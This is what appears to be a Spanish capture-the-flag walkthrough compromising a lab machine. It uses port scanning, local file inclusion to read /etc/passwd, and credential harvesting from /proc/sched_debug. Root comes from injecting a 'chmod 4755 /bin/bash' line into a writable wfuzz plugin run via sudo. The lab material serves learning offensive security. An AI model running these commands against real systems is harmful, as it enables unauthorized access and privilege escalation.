

### Enumeración de redes
*ARP-SCAN*
`arp-scan -I eth0 --localnet`


### 192.168.1.93
#### Enumeración de puertos y servicios
`nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 192.168.1.93 -oG allPorts`

```ad-info
PORT   STATE SERVICE
22/tcp open  ssh    
80/tcp open  http   
```


`nmap -p22,80 -sCV 192.168.1.93 -oN targeted`

#### Reconocimiento
### 80 http
Al navegar a la URL nos encontramos una pagina en la que se nos listan los servicios que están corriendo actualmente en la maquina victima, haremos una enumeración de directorios con [[GOBUSTER]]
`gobuster dir -u http://192.168.1.93/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,txt`

Encontramos la ruta a `index.php`
Que es la misma ruta en la que nos hallamos al navegar a la pagina web

Como es un `.php` haremos fuzzing con [[WFUZZ]] en búsqueda de parámetros de inyección después del archivo `.php` en búsqueda de obtener información del archivo `/etc/passwd`
`wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://192.168.1.93/index.php?FUZZ=/etc/passwd" --hh=361`

Encontramos que el parámetro `include` es valido para llamar a los archivos de la maquina y poder leerlos

Al enumerar el archivo `/etc/passwd` encontramos al usuario `ben` y al usuario `root`

Si hacemos un [[CURL]] apuntando al `/proc/sched_debug` y filtrando por el usuario `ben` podremos obtener sus credenciales, en este archivo lo que se puede ver son los procesos que esta ejecutando la maquina y en este caso al hacer el filtro encontramos las credenciales de este usuario

```ad-hint
ben:B3nP4zz
```

Probaremos a usarlas en el *SSH* `ssh ben@192.168.1.93` obtendremos acceso a la maquina

#### Escalada de privilegios
### Enumeración
**SUDO -L**  el usuario `BEN` puede ejecutar como root el binario `wfuzz`

**SUID**  buscamos permisos de escritura sobre todos los archivos de la maquina con
`find / -writable 2>/dev/null |grep -vE "proc|sys|tmp|run|dev|home|var"`
### Explotación

Encontrando así el archivo `/usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py`
que es un archivo que pertenece a [[WFUZZ]] viendo con el parámetro `help` de esta herramienta, encontramos que la opción `-z` permite incluir unos payloads específicos

Al tener permisos de escritura sobre el modulo mencionado anteriormente lo modificamos para cambiar los permisos SUID de la `bash` y así poder ejecutarla como root
`echo -e 'import os\nos.system("chmod 4755 /bin/bash")' >> /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py`

Ahora ejecutamos `WFUZZ` como root
`sudo -u root /usr/bin/wfuzz -c -z range,1-65535 -u http://127.0.0.1/FUZZ`

Vemos que se han cambiado los permisos de la `bash` haciendo un ls y la ejecutaremos con `/bin/bash -pi` obteniendo una bash como root

